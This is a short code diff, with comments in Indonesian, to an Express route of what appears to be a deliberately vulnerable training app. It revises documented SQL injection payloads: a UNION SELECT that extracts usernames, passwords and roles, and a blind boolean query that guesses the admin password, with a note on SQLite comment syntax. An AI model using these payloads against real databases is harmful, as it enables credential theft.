@@ -11,11 +11,15 @@ const router = express.Router();
 //   Memungkinkan UNION-based extraction dan
 //   blind boolean injection.
 //
-// Payload UNION:
-//   ' UNION SELECT id, username, password, email, role, avatar, bio, score FROM users--
+// CATATAN SQLite: Komentar -- HARUS diikuti spasi!
+//   ✅ ' UNION SELECT ... -- 
+//   ❌ ' UNION SELECT ...--
+//
+// Payload UNION (8 kolom dari challenges):
+//   ' UNION SELECT id, username, password, email, role, avatar, bio, score FROM users-- 
 //
 // Payload Blind:
-//   ' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a'--
+//   ' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a'-- 
 // ============================================
 router.get('/', async (req, res) => {
   const db = require('../config/database');
